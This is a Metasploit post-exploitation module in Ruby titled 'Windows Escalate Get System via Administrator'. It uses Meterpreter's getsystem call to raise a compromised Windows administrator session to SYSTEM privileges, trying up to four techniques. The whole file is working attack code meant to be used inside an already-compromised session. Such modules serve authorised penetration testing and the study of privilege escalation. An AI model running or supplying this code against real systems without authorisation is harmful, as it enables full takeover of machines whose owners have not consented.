##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'metasm'


class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Escalate Get System via Administrator',
      'Description'   => %q{
          This module uses the builtin 'getsystem' command to escalate
        the current session to the SYSTEM account from an administrator
        user account.
      },
      'License'       => MSF_LICENSE,
      'Author'        => 'hdm',
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options([
      OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-4), otherwise try them all", 0])
    ], self.class)

  end

  def unsupported
    print_error("This version of Meterpreter is not supported with this script!")
    raise Rex::Script::Completed
  end

  def run

    tech = datastore['TECHNIQUE'].to_i

    unsupported if client.platform !~ /win32|win64/i

    if is_system?
      print_good("This session already has SYSTEM privileges")
      return
    end

    result = client.priv.getsystem( tech )
    if result and result[0]
      print_good( "Obtained SYSTEM via technique #{result[1]}" )
    else
      print_error( "Failed to obtain SYSTEM access" )
    end
  end

end
